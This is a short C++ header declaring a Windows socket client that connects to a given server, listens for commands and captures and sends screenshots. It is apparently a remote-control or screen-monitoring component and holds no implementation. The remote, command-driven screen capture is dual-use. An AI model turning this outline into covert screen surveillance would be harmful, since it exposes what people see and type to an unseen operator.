#pragma once

#include <string>
#include <winsock2.h>

class Client {
    const char* m_serverIP;
    u_short m_port;
    SOCKET m_socket;
    
public:
    Client(const char* serverIP_, u_short port);
    ~Client();

    void start();

private:
    void listenForCommands();
    void captureScreenshot(const std::string& filePath);
    void sendScreenshot(SOCKET sock);
};
